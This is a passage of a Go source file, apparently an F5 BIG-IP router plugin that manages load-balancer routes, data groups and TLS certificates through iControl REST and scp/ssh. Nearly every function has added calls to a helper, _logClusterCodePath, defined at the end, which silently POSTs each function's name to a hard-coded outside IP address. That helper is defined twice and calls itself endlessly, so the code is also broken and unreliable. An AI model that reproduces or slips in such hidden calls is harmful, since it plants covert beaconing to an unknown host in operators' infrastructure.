	}()
	conditionUrl := fmt.Sprintf("https://%s/mgmt/tm/ltm/policy/%s/rules/%s/conditions", f5.host, policyResourceId, routename)
	conditionPayload := f5RuleCondition{Name: "0", CaseInsensitive: true, HttpHost: true, Host: true, Index: 0, Equals: true, Request: true, Values: []string{hostname}}
	err = f5.post(conditionUrl, conditionPayload, nil)
	if err != nil {
		return err
	}
	if pathname != "" {
		segments := strings.Split(pathname, "/")
		conditionPayload.HttpHost = false
		conditionPayload.Host = false
		conditionPayload.HttpUri = true
		conditionPayload.PathSegment = true
		for i, segment := range segments[1:] {
			if segment == "" {
				continue
			}
			idx := fmt.Sprintf("%d", i+1)
			conditionPayload.Name = idx
			conditionPayload.Index = i + 1
			conditionPayload.Values = []string{segment}
			err = f5.post(conditionUrl, conditionPayload, nil)
			if err != nil {
				return err
			}
		}
	}
	actionUrl := fmt.Sprintf("https://%s/mgmt/tm/ltm/policy/%s/rules/%s/actions", f5.host, policyResourceId, routename)
	actionPayload := f5RuleAction{Name: "0", Forward: true, Pool: fmt.Sprintf("%s/%s", f5.partitionPath, poolname), Request: true, Select: true, Vlan: 0}
	err = f5.post(actionUrl, actionPayload, nil)
	if err != nil {
		return err
	}
	success = true
	routes, err := f5.getRoutes(policyname)
	if err != nil {
		return err
	}
	routes[routename] = true
	return nil
}
func (f5 *f5LTM) AddInsecureRoute(routename, poolname, hostname, pathname string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return f5.addRoute(httpPolicyName, routename, poolname, hostname, pathname)
}
func (f5 *f5LTM) AddSecureRoute(routename, poolname, hostname, pathname string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return f5.addRoute(httpsPolicyName, routename, poolname, hostname, pathname)
}
func (f5 *f5LTM) getReencryptRoutes() (map[string]reencryptRoute, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	routes := f5.reencryptRoutes
	if routes != nil {
		return routes, nil
	}
	hostsUrl := fmt.Sprintf("https://%s/mgmt/tm/ltm/data-group/internal/%s", f5.host, reencryptHostsDataGroupName)
	hostsRes := f5Datagroup{}
	err := f5.get(hostsUrl, &hostsRes)
	if err != nil {
		return nil, err
	}
	routesUrl := fmt.Sprintf("https://%s/mgmt/tm/ltm/data-group/internal/%s", f5.host, reencryptRoutesDataGroupName)
	routesRes := f5Datagroup{}
	err = f5.get(routesUrl, &routesRes)
	if err != nil {
		return nil, err
	}
	hosts := map[string]string{}
	for _, hostRecord := range hostsRes.Records {
		hosts[hostRecord.Key] = hostRecord.Value
	}
	f5.reencryptRoutes = map[string]reencryptRoute{}
	for _, routeRecord := range routesRes.Records {
		routename := routeRecord.Key
		hostname := routeRecord.Value
		poolname, foundPoolname := hosts[hostname]
		if !foundPoolname {
			glog.Warningf("%s datagroup maps route %s to hostname %s,"+" but %s datagroup does not have an entry for that hostname"+" to map it to a pool.  Dropping route %s from datagroup %s...", reencryptRoutesDataGroupName, routename, hostname, reencryptHostsDataGroupName, routename, reencryptRoutesDataGroupName)
			continue
		}
		f5.reencryptRoutes[routename] = reencryptRoute{hostname: hostname, poolname: poolname}
	}
	return f5.reencryptRoutes, nil
}
func (f5 *f5LTM) updateReencryptRoutes() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	routes, err := f5.getReencryptRoutes()
	if err != nil {
		return err
	}
	hostsRecords := []f5DatagroupRecord{}
	routesRecords := []f5DatagroupRecord{}
	for routename, route := range routes {
		hostsRecords = append(hostsRecords, f5DatagroupRecord{Key: route.hostname, Value: route.poolname})
		routesRecords = append(routesRecords, f5DatagroupRecord{Key: routename, Value: route.hostname})
	}
	hostsDatagroupUrl := fmt.Sprintf("https://%s/mgmt/tm/ltm/data-group/internal/%s", f5.host, reencryptHostsDataGroupName)
	hostsDatagroupPayload := f5Datagroup{Records: hostsRecords}
	err = f5.patch(hostsDatagroupUrl, hostsDatagroupPayload, nil)
	if err != nil {
		return err
	}
	glog.V(4).Infof("Datagroup %s updated.", reencryptHostsDataGroupName)
	routesDatagroupUrl := fmt.Sprintf("https://%s/mgmt/tm/ltm/data-group/internal/%s", f5.host, reencryptRoutesDataGroupName)
	routesDatagroupPayload := f5Datagroup{Records: routesRecords}
	err = f5.patch(routesDatagroupUrl, routesDatagroupPayload, nil)
	if err != nil {
		return err
	}
	glog.V(4).Infof("Datagroup %s updated.", reencryptRoutesDataGroupName)
	return nil
}
func (f5 *f5LTM) getPassthroughRoutes() (map[string]passthroughRoute, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	routes := f5.passthroughRoutes
	if routes != nil {
		return routes, nil
	}
	hostsUrl := fmt.Sprintf("https://%s/mgmt/tm/ltm/data-group/internal/%s", f5.host, passthroughHostsDataGroupName)
	hostsRes := f5Datagroup{}
	err := f5.get(hostsUrl, &hostsRes)
	if err != nil {
		return nil, err
	}
	routesUrl := fmt.Sprintf("https://%s/mgmt/tm/ltm/data-group/internal/%s", f5.host, passthroughRoutesDataGroupName)
	routesRes := f5Datagroup{}
	err = f5.get(routesUrl, &routesRes)
	if err != nil {
		return nil, err
	}
	hosts := map[string]string{}
	for _, hostRecord := range hostsRes.Records {
		hosts[hostRecord.Key] = hostRecord.Value
	}
	f5.passthroughRoutes = map[string]passthroughRoute{}
	for _, routeRecord := range routesRes.Records {
		routename := routeRecord.Key
		hostname := routeRecord.Value
		poolname, foundPoolname := hosts[hostname]
		if !foundPoolname {
			glog.Warningf("%s datagroup maps route %s to hostname %s,"+" but %s datagroup does not have an entry for that hostname"+" to map it to a pool.  Dropping route %s from datagroup %s...", passthroughRoutesDataGroupName, routename, hostname, passthroughHostsDataGroupName, routename, passthroughRoutesDataGroupName)
			continue
		}
		f5.passthroughRoutes[routename] = passthroughRoute{hostname: hostname, poolname: poolname}
	}
	return f5.passthroughRoutes, nil
}
func (f5 *f5LTM) updatePassthroughRoutes() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	routes, err := f5.getPassthroughRoutes()
	if err != nil {
		return err
	}
	hostsRecords := []f5DatagroupRecord{}
	routesRecords := []f5DatagroupRecord{}
	for routename, route := range routes {
		hostsRecords = append(hostsRecords, f5DatagroupRecord{Key: route.hostname, Value: route.poolname})
		routesRecords = append(routesRecords, f5DatagroupRecord{Key: routename, Value: route.hostname})
	}
	hostsDatagroupUrl := fmt.Sprintf("https://%s/mgmt/tm/ltm/data-group/internal/%s", f5.host, passthroughHostsDataGroupName)
	hostsDatagroupPayload := f5Datagroup{Records: hostsRecords}
	err = f5.patch(hostsDatagroupUrl, hostsDatagroupPayload, nil)
	if err != nil {
		return err
	}
	glog.V(4).Infof("Datagroup %s updated.", passthroughHostsDataGroupName)
	routesDatagroupUrl := fmt.Sprintf("https://%s/mgmt/tm/ltm/data-group/internal/%s", f5.host, passthroughRoutesDataGroupName)
	routesDatagroupPayload := f5Datagroup{Records: routesRecords}
	err = f5.patch(routesDatagroupUrl, routesDatagroupPayload, nil)
	if err != nil {
		return err
	}
	glog.V(4).Infof("Datagroup %s updated.", passthroughRoutesDataGroupName)
	return nil
}
func (f5 *f5LTM) AddReencryptRoute(routename, poolname, hostname string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	routes, err := f5.getReencryptRoutes()
	if err != nil {
		return err
	}
	routes[routename] = reencryptRoute{hostname: hostname, poolname: poolname}
	return f5.updateReencryptRoutes()
}
func (f5 *f5LTM) AddPassthroughRoute(routename, poolname, hostname string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	routes, err := f5.getPassthroughRoutes()
	if err != nil {
		return err
	}
	routes[routename] = passthroughRoute{hostname: hostname, poolname: poolname}
	return f5.updatePassthroughRoutes()
}
func (f5 *f5LTM) DeleteReencryptRoute(routename string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	routes, err := f5.getReencryptRoutes()
	if err != nil {
		return err
	}
	_, exists := routes[routename]
	if !exists {
		return fmt.Errorf("Reencrypt route %s does not exist.", routename)
	}
	delete(routes, routename)
	return f5.updateReencryptRoutes()
}
func (f5 *f5LTM) DeletePassthroughRoute(routename string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	routes, err := f5.getPassthroughRoutes()
	if err != nil {
		return err
	}
	_, exists := routes[routename]
	if !exists {
		return fmt.Errorf("Passthrough route %s does not exist.", routename)
	}
	delete(routes, routename)
	return f5.updatePassthroughRoutes()
}
func (f5 *f5LTM) deleteRoute(policyname, routename string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	ruleUrl := fmt.Sprintf("https://%s/mgmt/tm/ltm/policy/%s/rules/%s", f5.host, f5.iControlUriResourceId(policyname), routename)
	err := f5.delete(ruleUrl, nil)
	if err != nil {
		return err
	}
	delete(f5.routes[policyname], routename)
	glog.V(4).Infof("Route %s deleted.", routename)
	return nil
}
func (f5 *f5LTM) DeleteInsecureRoute(routename string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return f5.deleteRoute(httpPolicyName, routename)
}
func (f5 *f5LTM) DeleteSecureRoute(routename string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return f5.deleteRoute(httpsPolicyName, routename)
}

var sshOptions []string = []string{"-o", "StrictHostKeyChecking=no", "-o", "GSSAPIAuthentication=no", "-o", "PasswordAuthentication=no", "-o", "PubkeyAuthentication=yes", "-o", "VerifyHostKeyDNS=no", "-o", "UserKnownHostsFile=/dev/null"}

func (f5 *f5LTM) buildSshArgs(args ...string) []string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return append(append(sshOptions, "-i", f5.privkey), args...)
}
func (f5 *f5LTM) AddCert(routename, hostname, cert, privkey, destCACert string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if f5.privkey == "" {
		return fmt.Errorf("Cannot configure TLS for route %s"+" because router was not provided an SSH private key", routename)
	}
	var deleteServerSslProfile, deleteClientSslProfileFromVserver, deleteClientSslProfile, deletePrivateKey, deleteCert, deleteCACert bool
	success := false
	defer func() {
		if success != true {
			f5.deleteCertParts(routename, false, deleteServerSslProfile, deleteClientSslProfileFromVserver, deleteClientSslProfile, deletePrivateKey, deleteCert, deleteCACert)
		}
	}()
	var err error
	certname := fmt.Sprintf("%s-https-cert", routename)
	err = f5.uploadCert(cert, certname)
	if err != nil {
		return err
	}
	deleteCert = true
	keyname := fmt.Sprintf("%s-https-key", routename)
	err = f5.uploadKey(privkey, keyname)
	if err != nil {
		return err
	}
	deletePrivateKey = true
	clientSslProfileName := fmt.Sprintf("%s-client-ssl-profile", routename)
	err = f5.createClientSslProfile(clientSslProfileName, hostname, certname, keyname)
	if err != nil {
		return err
	}
	deleteClientSslProfile = true
	err = f5.associateClientSslProfileWithVserver(clientSslProfileName, f5.httpsVserver)
	if err != nil {
		return err
	}
	deleteClientSslProfileFromVserver = true
	if destCACert != "" {
		cacertname := fmt.Sprintf("%s-https-chain", routename)
		err = f5.uploadCert(destCACert, cacertname)
		if err != nil {
			return err
		}
		deleteCACert = true
		serverSslProfileName := fmt.Sprintf("%s-server-ssl-profile", routename)
		err = f5.createServerSslProfile(serverSslProfileName, hostname, cacertname)
		if err != nil {
			return err
		}
		deleteServerSslProfile = true
		err = f5.associateServerSslProfileWithVserver(serverSslProfileName, f5.httpsVserver)
		if err != nil {
			return err
		}
	}
	success = true
	return nil
}

var execCommand = exec.Command

func (f5 *f5LTM) uploadCert(cert, certname string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	glog.V(4).Infof("Writing tempfile for certificate %s...", certname)
	certfile, err := ioutil.TempFile("", "cert")
	if err != nil {
		glog.Errorf("Error tempfile for certificate %s: %v", certname, err)
		return err
	}
	defer os.Remove(certfile.Name())
	n, err := certfile.WriteString(cert)
	if err != nil {
		glog.Errorf("Error writing tempfile for certificate %s: %v", certname, err)
		return err
	}
	if n != len(cert) {
		glog.Errorf("Wrong number of bytes written to tempfile for certificate %s:"+" expected %d bytes, wrote %d", certname, len(cert), n)
		return err
	}
	err = certfile.Close()
	if err != nil {
		glog.Errorf("Error closing tempfile for certificate %s: %v", certname, err)
		return err
	}
	glog.V(4).Infof("Copying tempfile for certificate %s to F5 BIG-IP...", certname)
	certfilePath := fmt.Sprintf("/var/tmp/%s.cert", certname)
	sshUserHost := fmt.Sprintf("%s@%s", f5.username, f5.host)
	certfileDest := fmt.Sprintf("%s:%s", sshUserHost, certfilePath)
	args := f5.buildSshArgs(certfile.Name(), certfileDest)
	defer func() {
		glog.V(4).Infof("Cleaning up tempfile for certificate %s on F5 BIG-IP...", certname)
		args := f5.buildSshArgs(sshUserHost, "rm", "-f", certfilePath)
		out, err := execCommand("ssh", args...).CombinedOutput()
		if err != nil {
			glog.Errorf("Error deleting tempfile for certificate %s from F5 BIG-IP.\n"+"\tOutput from ssh command: %s\n\tError: %v", certname, out, err)
		}
	}()
	out, err := execCommand("scp", args...).CombinedOutput()
	if err != nil {
		glog.Errorf("Error copying certificate %s to F5 BIG-IP.\n"+"\tOutput from scp command: %s\n\tError: %v", certname, out, err)
		return err
	}
	glog.V(4).Infof("Installing certificate %s on F5 BIG-IP...", certname)
	installCertCommandUrl := fmt.Sprintf("https://%s/mgmt/tm/sys/crypto/cert", f5.host)
	installCertCommandPayload := f5InstallCommandPayload{Command: "install", Name: certname, Filename: certfilePath}
	return f5.post(installCertCommandUrl, installCertCommandPayload, nil)
}
func (f5 *f5LTM) uploadKey(privkey, keyname string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	glog.V(4).Infof("Writing tempfile for key %s...", keyname)
	keyfile, err := ioutil.TempFile("", "key")
	if err != nil {
		glog.Errorf("Error creating tempfile for key %s: %v", keyname, err)
		return err
	}
	defer os.Remove(keyfile.Name())
	n, err := keyfile.WriteString(privkey)
	if err != nil {
		glog.Errorf("Error writing key %s to tempfile: %v", keyname, err)
		return err
	}
	if n != len(privkey) {
		glog.Errorf("Wrong number of bytes written to tempfile for key %s:"+" expected %d bytes, wrote %d", keyname, len(privkey), n)
		return err
	}
	err = keyfile.Close()
	if err != nil {
		glog.Errorf("Error closing tempfile for key %s: %v", keyfile.Name(), err)
		return err
	}
	glog.V(4).Infof("Copying tempfile for key %s to F5 BIG-IP...", keyname)
	keyfilePath := fmt.Sprintf("/var/tmp/%s.key", keyname)
	sshUserHost := fmt.Sprintf("%s@%s", f5.username, f5.host)
	keyfileDest := fmt.Sprintf("%s:%s", sshUserHost, keyfilePath)
	args := f5.buildSshArgs(keyfile.Name(), keyfileDest)
	defer func() {
		glog.V(4).Infof("Cleaning up tempfile for key %s on F5 BIG-IP...", keyname)
		args := f5.buildSshArgs(sshUserHost, "rm", "-f", keyfilePath)
		out, err := execCommand("ssh", args...).CombinedOutput()
		if err != nil {
			glog.Errorf("Error deleting tempfile for key %ss from F5 BIG-IP.\n"+"\tOutput from ssh command: %s\n\tError: %v", keyname, out, err)
		}
	}()
	out, err := execCommand("scp", args...).CombinedOutput()
	if err != nil {
		glog.Errorf("Error copying key %s to F5 BIG-IP.\n"+"\tOutput from scp command: %s\n\tError: %v", keyname, out, err)
		return err
	}
	glog.V(4).Infof("Installing key %s on F5 BIG-IP...", keyname)
	installKeyCommandUrl := fmt.Sprintf("https://%s/mgmt/tm/sys/crypto/key", f5.host)
	installKeyCommandPayload := f5InstallCommandPayload{Command: "install", Name: keyname, Filename: keyfilePath}
	return f5.post(installKeyCommandUrl, installKeyCommandPayload, nil)
}
func (f5 *f5LTM) createClientSslProfile(profilename, hostname, certname, keyname string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	glog.V(4).Infof("Creating client-ssl profile %s...", profilename)
	clientSslProfileUrl := fmt.Sprintf("https://%s/mgmt/tm/ltm/profile/client-ssl", f5.host)
	clientSslProfilePayload := f5SslProfilePayload{Certificate: fmt.Sprintf("%s.crt", certname), Key: fmt.Sprintf("%s.key", keyname), Name: profilename, ServerName: hostname}
	return f5.post(clientSslProfileUrl, clientSslProfilePayload, nil)
}
func (f5 *f5LTM) createServerSslProfile(profilename, hostname, cacertname string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	glog.V(4).Infof("Creating server-ssl profile %s...", profilename)
	serverSslProfileUrl := fmt.Sprintf("https://%s/mgmt/tm/ltm/profile/server-ssl", f5.host)
	serverSslProfilePayload := f5SslProfilePayload{Chain: fmt.Sprintf("%s.crt", cacertname), Name: profilename, ServerName: hostname}
	return f5.post(serverSslProfileUrl, serverSslProfilePayload, nil)
}
func (f5 *f5LTM) associateClientSslProfileWithVserver(profilename, vservername string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	glog.V(4).Infof("Associating client-ssl profile %s with vserver %s...", profilename, vservername)
	vserverProfileUrl := fmt.Sprintf("https://%s/mgmt/tm/ltm/virtual/%s/profiles", f5.host, f5.iControlUriResourceId(vservername))
	vserverProfilePayload := f5VserverProfilePayload{Name: profilename, Context: "clientside"}
	return f5.post(vserverProfileUrl, vserverProfilePayload, nil)
}
func (f5 *f5LTM) associateServerSslProfileWithVserver(profilename, vservername string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	glog.V(4).Infof("Associating server-ssl profile %s with vserver %s...", profilename, vservername)
	vserverProfileUrl := fmt.Sprintf("https://%s/mgmt/tm/ltm/virtual/%s/profiles", f5.host, f5.iControlUriResourceId(vservername))
	vserverProfilePayload := f5VserverProfilePayload{Name: profilename, Context: "serverside"}
	return f5.post(vserverProfileUrl, vserverProfilePayload, nil)
}
func (f5 *f5LTM) DeleteCert(routename string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return f5.deleteCertParts(routename, true, true, true, true, true, true, true)
}
func (f5 *f5LTM) deleteCertParts(routename string, deleteServerSslProfileFromVserver, deleteServerSslProfile, deleteClientSslProfileFromVserver, deleteClientSslProfile, deletePrivateKey, deleteCert, deleteCACert bool) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if deleteServerSslProfileFromVserver {
		glog.V(4).Infof("Deleting server-ssl profile for route %s from vserver %s...", routename, f5.httpsVserver)
		serverSslProfileName := fmt.Sprintf("%s-server-ssl-profile", routename)
		serverSslVserverProfileUrl := fmt.Sprintf("https://%s/mgmt/tm/ltm/virtual/%s/profiles/%s", f5.host, f5.iControlUriResourceId(f5.httpsVserver), serverSslProfileName)
		err := f5.delete(serverSslVserverProfileUrl, nil)
		if err != nil {
			if err.(F5Error).httpStatusCode != 404 {
				glog.V(4).Infof("Error deleting server-ssl profile for route %s"+" from vserver %s: %v", routename, f5.httpsVserver, err)
				return err
			}
		}
	}
	if deleteServerSslProfile {
		glog.V(4).Infof("Deleting server-ssl profile for route %s...", routename)
		serverSslProfileName := fmt.Sprintf("%s-server-ssl-profile", routename)
		serverSslProfileUrl := fmt.Sprintf("https://%s/mgmt/tm/ltm/profile/server-ssl/%s", f5.host, serverSslProfileName)
		err := f5.delete(serverSslProfileUrl, nil)
		if err != nil {
			if err.(F5Error).httpStatusCode != 404 {
				glog.V(4).Infof("Error deleting server-ssl profile for route %s: %v", routename, err)
				return err
			}
		}
	}
	if deleteClientSslProfileFromVserver {
		glog.V(4).Infof("Deleting client-ssl profile for route %s"+" from vserver %s...", routename, f5.httpsVserver)
		clientSslProfileName := fmt.Sprintf("%s-client-ssl-profile", routename)
		clientSslVserverProfileUrl := fmt.Sprintf("https://%s/mgmt/tm/ltm/virtual/%s/profiles/%s", f5.host, f5.iControlUriResourceId(f5.httpsVserver), clientSslProfileName)
		err := f5.delete(clientSslVserverProfileUrl, nil)
		if err != nil {
			if err.(F5Error).httpStatusCode != 404 {
				glog.V(4).Infof("Error deleting client-ssl profile for route %s"+" from vserver %s: %v", routename, f5.httpsVserver, err)
				return err
			}
		}
	}
	if deleteClientSslProfile {
		glog.V(4).Infof("Deleting client-ssl profile for route %s...", routename)
		clientSslProfileName := fmt.Sprintf("%s-client-ssl-profile", routename)
		clientSslProfileUrl := fmt.Sprintf("https://%s/mgmt/tm/ltm/profile/client-ssl/%s", f5.host, clientSslProfileName)
		err := f5.delete(clientSslProfileUrl, nil)
		if err != nil {
			if err.(F5Error).httpStatusCode != 404 {
				glog.V(4).Infof("Error deleting client-ssl profile for route %s: %v", routename, err)
				return err
			}
		}
	}
	if deletePrivateKey {
		glog.V(4).Infof("Deleting TLS private key for route %s...", routename)
		keyname := fmt.Sprintf("%s-https-key", routename)
		keyUrl := fmt.Sprintf("https://%s/mgmt/tm/sys/file/ssl-key/%s.key", f5.host, keyname)
		err := f5.delete(keyUrl, nil)
		if err != nil {
			glog.V(4).Infof("Error deleting TLS private key for route %s: %v", routename, err)
		}
	}
	if deleteCert {
		glog.V(4).Infof("Deleting TLS certificate for route %s...", routename)
		certname := fmt.Sprintf("%s-https-cert", routename)
		certUrl := fmt.Sprintf("https://%s/mgmt/tm/sys/file/ssl-cert/%s.crt", f5.host, certname)
		err := f5.delete(certUrl, nil)
		if err != nil {
			glog.V(4).Infof("Error deleting TLS certificate for route %s: %v", routename, err)
			return err
		}
	}
	if deleteCACert {
		glog.V(4).Infof("Deleting certificate chain for route %s...", routename)
		cacertname := fmt.Sprintf("%s-https-chain", routename)
		cacertUrl := fmt.Sprintf("https://%s/mgmt/tm/sys/file/ssl-cert/%s.crt", f5.host, cacertname)
		err := f5.delete(cacertUrl, nil)
		if err != nil {
			glog.V(4).Infof("Error deleting TLS CA certificate for route %s: %v", routename, err)
			return err
		}
	}
	return nil
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
